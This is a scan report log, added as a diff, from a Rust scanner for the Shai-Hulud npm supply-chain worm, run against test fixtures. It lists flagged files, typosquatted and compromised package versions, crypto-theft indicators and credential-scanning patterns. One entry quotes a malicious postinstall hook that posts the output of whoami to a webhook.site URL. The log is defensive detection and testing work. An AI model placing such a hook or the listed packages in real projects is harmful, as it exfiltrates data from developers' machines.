@@ -1,0 +1,311 @@
+    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.27s
+     Running `target\debug\shai-hulud-scanner.exe ../shai-hulud-detect/test-cases/ --log-file logs/rust/test-cases/comprehensive-analysis.log`
+🔍 Found 40 files to analyze
+🔍 Checking for malicious workflow files...
+🔍 Checking 1 pnpm-lock.yaml files...
+🔍 Checking for suspicious git branches...
+   -> No .git directory found, skipping branch check.
+🔍 Checking for suspicious postinstall hooks...
+🔍 Checking for cryptocurrency theft patterns...
+🔍 Checking for specialized network exfiltration patterns...
+🔍 Checking package lock files for integrity issues...
+🔍 Checking for Trufflehog activity and secret scanning...
+🔍 Checking for Shai-Hulud repositories and migration patterns...
+📄 Results saved to: logs/rust/test-cases/scan_results.json
+==============================================
+      SHAI-HULUD DETECTION REPORT
+==============================================
+
+🚨 HIGH RISK: Malicious workflow files detected:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/.github/workflows/shai-hulud-workflow.yml
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/.github/workflows/shai-hulud-workflow.yml
+   │  Context: HIGH RISK: Suspicious patterns detected: webhook.site reference, malicious webhook endpoint
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/.github/workflows/shai-hulud-workflow.yml
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/.github/workflows/shai-hulud-workflow.yml
+   │  Context: HIGH RISK: Malicious workflow file detected: Known malicious workflow filename
+   └─
+
+⚠️  MEDIUM RISK: Suspicious package versions detected:
+   - Package: ansi-styles@6.2.2
+     Found in: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/package.json
+   NOTE: Manual review required to determine if these are malicious.
+   - Package: chalk@5.6.1
+     Found in: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/package.json
+   NOTE: Manual review required to determine if these are malicious.
+   - Package: debug@4.4.2
+     Found in: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/package.json
+   NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/package.json
+     └─ Contains crypto libraries or suspicious patterns
+NOTE: NOTE: These may be legitimate crypto tools or framework code.
+   NOTE: These may be legitimate crypto tools or framework code.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/package.json
+     └─ Contains suspicious packages: Known typosquatting of '@typescript-eslint': @typescript_eslinter/eslint (missing hyphen and character change), Known typosquatting of 'lodash': lodsh (missing character (a)), Known typosquatting of 'react': reаct (cyrillic character substitution (а instead of a))
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/debug-js/package.json
+     └─ Contains suspicious packages: Debug package detected
+   - Package: @ctrl/deluge@1.2.0
+     Found in: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package.json
+   NOTE: Manual review required to determine if these are malicious.
+   - Package: @nativescript-community/ui-material-core@7.2.49
+     Found in: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package.json
+   NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/package.json
+     └─ Contains crypto libraries or suspicious patterns
+NOTE: NOTE: These may be legitimate crypto tools or framework code.
+   NOTE: These may be legitimate crypto tools or framework code.
+   - Package: @ctrl/tinycolor@^4.0.0
+     Found in: /c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json
+   NOTE: Manual review required to determine if these are malicious.
+   - Package: @operato/board@~9.0.35
+     Found in: /c/Users/gstra/Code/shai-hulud-detect/test-cases/semver-matching/package.json
+   NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/typosquatting-project/package.json
+     └─ Contains suspicious packages: Known typosquatting of '@types/node': @typеs/node (cyrillic character substitution (е instead of e)), Known typosquatting of 'express': expres (missing character (s)), Known typosquatting of 'lodash': lodsh (missing character (a)), Known typosquatting of 'react': raect (character transposition (a<->e))
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/package.json
+     └─ Suspicious patterns detected: Potential typosquatting package detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/false-positive-project/express-server.js
+     └─ Suspicious patterns detected: Contains credential scanning patterns, Potential typosquatting package detected, Credential mentions detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/typosquatting-project/package.json
+     └─ Suspicious patterns detected: Potential typosquatting package detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   NOTE: Manual review required to determine if these are malicious.
+   - Package: debug@4.4.2
+     Found in: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/package.json
+
+⚠️  MEDIUM RISK: Suspicious content patterns:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+   │  Context: HIGH RISK: Suspicious patterns detected: Pastebin exfiltration detected, Hardcoded private IP address detected, C2 WebSocket connection detected
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js
+   │  Context: HIGH RISK: Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Credential harvesting patterns detected, Contains credential scanning patterns, Potentially suspicious environment variable access, Credential mentions detected
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh
+   │  Context: HIGH RISK: Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious.js
+   │  Context: HIGH RISK: Suspicious patterns detected: webhook.site reference, malicious webhook endpoint
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json
+   │  Context: HIGH RISK: Suspicious patterns detected: webhook.site reference, malicious webhook endpoint
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/mixed-project/suspicious.js
+     └─ Suspicious patterns detected: webhook.site reference, webhook.site reference
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js
+   │  Context: HIGH RISK: Suspicious patterns detected: webhook.site reference, malicious webhook endpoint, Hardcoded private IP address detected, C2 WebSocket connection detected
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+     └─ Network exfiltration pattern: Pastebin exfiltration detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+     └─ Network exfiltration pattern: C2 WebSocket connection detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+     └─ Network exfiltration pattern: WebSocket connection to external endpoint detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js
+     └─ Network exfiltration pattern: WebSocket connection to external endpoint detected
+
+🚨 HIGH RISK: Cryptocurrency theft patterns detected:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js
+   │  Context: HIGH RISK: Suspicious patterns detected: XMLHttpRequest prototype modification detected, Known attacker wallet address detected - HIGH RISK, Cryptocurrency regex patterns detected, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js
+   │  Context: HIGH RISK: Suspicious patterns detected: Known attacker wallet address detected - HIGH RISK, Cryptocurrency regex patterns detected, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/crypto-theft.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/crypto-theft.js
+   │  Context: HIGH RISK: Suspicious patterns detected: XMLHttpRequest prototype modification detected, Known attacker wallet address detected - HIGH RISK, Cryptocurrency regex patterns detected, Phishing domain npmjs.help detected, Ethereum wallet address patterns detected
+   └─
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/malicious-chalk.js
+   │  Context: HIGH RISK: XMLHttpRequest prototype modification detected
+   └─
+NOTE: NOTE: These patterns strongly indicate crypto theft malware from the September 8 attack.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js
+   │  Context: HIGH RISK: Known attacker wallet address detected - HIGH RISK
+   └─
+NOTE: NOTE: These patterns strongly indicate crypto theft malware from the September 8 attack.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/crypto-theft.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/crypto-theft.js
+   │  Context: HIGH RISK: XMLHttpRequest prototype modification detected
+   └─
+NOTE: NOTE: These patterns strongly indicate crypto theft malware from the September 8 attack.
+
+⚠️  MEDIUM RISK: Potential cryptocurrency manipulation patterns:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js
+     └─ JavaScript obfuscation detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js
+     └─ Potential cryptocurrency patterns: Ethereum wallet address patterns detected
+NOTE: NOTE: These may be legitimate crypto tools or framework code.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js
+     └─ Potential cryptocurrency patterns: Ethereum wallet address patterns detected
+NOTE: NOTE: These may be legitimate crypto tools or framework code.
+
+🚨 HIGH RISK: Trufflehog/secret scanning activity detected:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh
+   │  Context: HIGH RISK: Trufflehog binary found
+   └─
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh
+   │  Context: HIGH RISK: Trufflehog binary found
+   └─
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/actual-credential-harvester.js
+   │  Context: HIGH RISK: HIGH RISK: Suspicious Trufflehog/secret scanning activity
+   └─
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious-trufflehog-wrapper.sh
+   │  Context: HIGH RISK: HIGH RISK: Suspicious Trufflehog/secret scanning activity
+   └─
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh
+   │  Context: HIGH RISK: HIGH RISK: Suspicious Trufflehog/secret scanning activity
+   └─
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-security-project/security-scanner.py
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-security-project/security-scanner.py
+   │  Context: HIGH RISK: HIGH RISK: Suspicious Trufflehog/secret scanning activity
+   └─
+
+⚠️  MEDIUM RISK: Potentially suspicious secret scanning patterns:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/trufflehog-script.sh
+     └─ Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-security-project/security-scanner.py
+     └─ Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js
+     └─ MEDIUM RISK: Potential secret scanning activity
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/edge-case-project/node_modules/@types/node/process.d.ts
+     └─ MEDIUM RISK: Potential secret scanning activity
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/false-positive-project/express-server.js
+     └─ MEDIUM RISK: Potential secret scanning activity
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/false-positive-project/webpack.config.js
+     └─ MEDIUM RISK: Potential secret scanning activity
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js
+     └─ MEDIUM RISK: Potential secret scanning activity
+
+⚠️  MEDIUM RISK: Package integrity issues detected:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-lockfile-pnpm/pnpm-lock.yaml
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-lockfile-pnpm/pnpm-lock.yaml
+   │  Context: HIGH RISK: pnpm lockfile contains compromised packages: @ctrl/tinycolor@4.1.2
+   └─
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-lockfile/package-lock.json
+     └─ Package lockfile integrity issues: Compromised packages detected: @ctrl/tinycolor@4.1.2
+NOTE: NOTE: These issues may indicate tampering with package dependencies.
+
+⚠️  MEDIUM RISK: Suspicious postinstall hooks detected:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package-with-postinstall.json
+   │  Context: HIGH RISK: Suspicious postinstall hook detected: curl -X POST https://webhook.site/bb8ca5f6-4175-45d2-b042-fc9ebb8170b7 -d $(whoami)
+   └─
+NOTE: NOTE: Postinstall hooks can execute arbitrary code during package installation.
+
+🚨 HIGH RISK: Other issues detected:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/obfuscated-payload.js
+   │  Context: HIGH RISK: Phishing domain npmjs.help detected
+   └─
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js
+   ┌─ File: /c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js
+   │  Context: HIGH RISK: HIGH RISK: Suspicious Trufflehog/secret scanning activity
+   └─
+
+⚠️  MEDIUM RISK: Other issues detected:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/mixed-project/package.json
+     └─ Contains suspicious packages: Mixed project context: mixed-project
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-lockfile-pnpm/pnpm-lock.yaml
+     └─ Recently modified lockfile contains @ctrl packages (potential worm activity)
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+     └─ Network exfiltration pattern: Hardcoded private IP address detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/comprehensive-test/suspicious.js
+     └─ Network exfiltration pattern: Base64 decoding detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/malicious.js
+     └─ Network exfiltration pattern: Webhook.site exfiltration detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js
+     └─ Network exfiltration pattern: Hardcoded private IP address detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js
+     └─ Network exfiltration pattern: Base64 decoding detected
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/network-exfiltration-project/malicious.js
+     └─ Network exfiltration pattern: Webhook.site exfiltration detected
+
+ℹ️  LOW RISK: Other informational warnings:
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/infected-project/package.json
+     └─ Contains packages from affected namespaces
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-security-project/package.json
+     └─ Contains suspicious packages: Security project: security-scanner, Security scanning tool description
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/namespace-warning/package.json
+     └─ Contains packages from affected namespaces
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/chalk-debug-attack/package.json
+     └─ Suspicious patterns detected: Cryptocurrency regex patterns detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js
+     └─ Suspicious patterns detected: Cryptocurrency regex patterns detected, Ethereum wallet address patterns detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/http-requests.js
+     └─ Suspicious patterns detected: Cryptocurrency regex patterns detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/package.json
+     └─ Suspicious patterns detected: Cryptocurrency regex patterns detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/edge-case-project/documentation.md
+     └─ Suspicious patterns detected: Contains trufflehog references in source code, Contains credential scanning patterns, Credential mentions detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/edge-case-project/node_modules/@types/node/process.d.ts
+     └─ Suspicious patterns detected: Contains credential scanning patterns, Credential mentions detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/false-positive-project/webpack.config.js
+     └─ Suspicious patterns detected: Contains credential scanning patterns, Credential mentions detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/package.json
+     └─ Suspicious patterns detected: Cryptocurrency regex patterns detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js
+     └─ Suspicious patterns detected: Cryptocurrency regex patterns detected, Ethereum wallet address patterns detected
+NOTE: NOTE: Manual review required to determine if these are malicious.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/common-crypto-libs/ethers-usage.js
+     └─ Cryptocurrency regex patterns detected
+NOTE: NOTE: These may be legitimate crypto tools or framework code.
+   - /c/Users/gstra/Code/shai-hulud-detect/test-cases/legitimate-crypto/wallet-utils.js
+     └─ Cryptocurrency regex patterns detected
+NOTE: NOTE: These may be legitimate crypto tools or framework code.
+
+
+==============================================
+🔍 SUMMARY:
+   Scan Duration: 1.03 seconds
+   High Risk Issues: 24
+   Medium Risk Issues: 39
+   Low Risk (informational): 15
+   Total Critical Issues: 78
+
+⚠️  IMPORTANT:
+   - High risk issues likely indicate actual compromise
+   - Immediate investigation and remediation required
+   - Consider running additional security scans
+   - Review your npm audit logs and package history
+==============================================
+📄 Console log saved to: logs/rust/test-cases/comprehensive-analysis.log
+error: process didn't exit successfully: `target\debug\shai-hulud-scanner.exe ../shai-hulud-detect/test-cases/ --log-file logs/rust/test-cases/comprehensive-analysis.log` (exit code: 2)
